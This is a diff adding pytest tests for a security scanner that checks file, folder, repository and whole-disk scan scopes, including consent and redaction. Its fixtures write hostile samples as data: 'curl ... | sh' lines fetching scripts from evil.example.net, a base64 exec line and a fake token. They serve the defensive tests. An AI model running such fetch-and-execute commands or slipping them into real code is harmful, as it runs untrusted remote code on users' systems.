@@ -96,6 +96,82 @@ def test_strict_open_scans_hidden_dirs_and_records_mode(isolated_dirs, risky_rep
     assert any("zzz.pth" in f for f in files) and any("node_modules" in f for f in files)
 
 
+def test_scope_file_folder_repo(isolated_dirs, risky_repo: Path, tmp_path: Path):
+    s = isolated_dirs["server"]
+    # 指定文件：不要求先 review_open，也不限于任何仓库
+    r = s.review_scope("文件", str(risky_repo / "src" / "app.py"))
+    assert r["范围"]["模式"] == "文件" and r["范围"]["文件数"] == 1
+    sc = s.review_scan()
+    assert sc["本批文件范围"]["总文件数"] == 1 and {"SEC004", "RX001"} <= {f["规则ID"] for f in sc["发现"]}
+    assert Path(r["报告"]["报告路径"]).name == "文件-app.py.md"
+
+    # 指定文件夹：仓库之外的任意目录
+    outside = tmp_path / "somewhere" / "else"
+    outside.mkdir(parents=True)
+    (outside / "x.sh").write_text("curl https://evil.example.net/o.sh | sh\n", encoding="utf-8")
+    (outside / ".env").write_text("TOKEN=zzz-secret-value-123456\n", encoding="utf-8")
+    r = s.review_scope("文件夹", str(outside))
+    assert r["范围"]["文件数"] == 2 and ".env" in r["密钥文件告知"]
+    sc = s.review_scan()
+    assert any(f["规则ID"] == "RX001" for f in sc["发现"])
+    assert "zzz-secret-value-123456" not in str(sc)
+    rd = s.review_read(str(outside / "x.sh"))
+    assert rd["untrusted_content"] is True
+    inv = s.review_secrets_inventory()
+    assert inv["清单"][0]["条目数"] >= 1 and "zzz-secret-value-123456" not in str(inv)
+
+    # 整仓：从子目录进去也定位到仓库根，严格模式缓存清单
+    r = s.review_scope("整仓", str(risky_repo / "src"))
+    assert r["范围"]["根路径"] == [str(risky_repo)] and r["范围"]["严格模式"] is True
+    files = {Path(l).relative_to(risky_repo).as_posix() for l in Path(r["范围"]["文件清单文件"]).read_text().splitlines()}
+    assert ".venv/lib/python3.12/site-packages/zzz.pth" in files and ".git/hooks/post-checkout" in files
+    assert not any(f.startswith(".git/objects") for f in files)
+    with pytest.raises(Exception):
+        s.review_scope("整个宇宙", str(risky_repo))
+    # review_open 回到仓库模式后，范围清单清空
+    s.review_open(str(risky_repo))
+    assert s.rc.load_state()["当前范围"] is None
+
+
+def test_scope_whole_disk_requires_confirm_and_skips_other_users(isolated_dirs, risky_repo: Path, tmp_path: Path, monkeypatch):
+    s = isolated_dirs["server"]
+    fake_disk = tmp_path / "disk"
+    me = fake_disk / "home" / "me"
+    other = fake_disk / "home" / "other"
+    (me / "proj").mkdir(parents=True)
+    other.mkdir(parents=True)
+    (me / "proj" / "a.py").write_text('exec(base64.b64decode("x"))\n', encoding="utf-8")
+    (other / "secret.py").write_text('os.system("curl https://evil.example.net/z | sh")\n', encoding="utf-8")
+    (fake_disk / "proc").mkdir()
+    (fake_disk / "proc" / "cpuinfo").write_text("x", encoding="utf-8")
+    monkeypatch.setattr(s.rc, "disk_roots", lambda: [fake_disk])
+    monkeypatch.setattr(s.rc, "other_user_homes", lambda: [other])
+    monkeypatch.setattr(s.rc, "_PSEUDO_FS", (str(fake_disk / "proc"),))
+
+    denied = s.review_scope("整盘")
+    assert denied["需要授权"] is True and "✅ 授权只读扫描整盘" in denied["如何授权"]
+    assert str(other) in denied["其他用户目录"]
+
+    r = s.review_scope("整盘", confirm="✅ 授权只读扫描整盘")
+    listed = Path(r["范围"]["文件清单文件"]).read_text().splitlines()
+    assert str(me / "proj" / "a.py") in listed
+    assert str(other / "secret.py") not in listed, "默认不进其他用户目录"
+    assert str(fake_disk / "proc" / "cpuinfo") not in listed
+    assert r["范围"]["跳过的其他用户目录"] == [str(other)]
+    assert r["范围"]["跳过的伪文件系统"] == [str(fake_disk / "proc")]
+    assert Path(r["报告"]["报告路径"]).name.startswith("整盘-")
+
+    # 含其他用户目录：确认词不同，且要明说
+    wrong = s.review_scope("整盘", confirm="✅ 授权只读扫描整盘", include_other_users=True)
+    assert wrong["需要授权"] is True
+    r2 = s.review_scope("整盘", confirm="✅ 授权只读扫描整盘，含其他用户目录", include_other_users=True)
+    listed2 = Path(r2["范围"]["文件清单文件"]).read_text().splitlines()
+    assert str(other / "secret.py") in listed2 and any("管理职责" in n for n in r2["说明"])
+    # 清单在状态目录，不在被审位置
+    assert Path(r2["范围"]["文件清单文件"]).is_relative_to(isolated_dirs["state"])
+    assert not any(p.suffix == ".txt" and "scopes" in str(p) for p in fake_disk.rglob("*"))
+
+
 def test_references_of_symbol(isolated_dirs, risky_repo: Path):
     s = isolated_dirs["server"]
     s.review_open(str(risky_repo), strict=True)
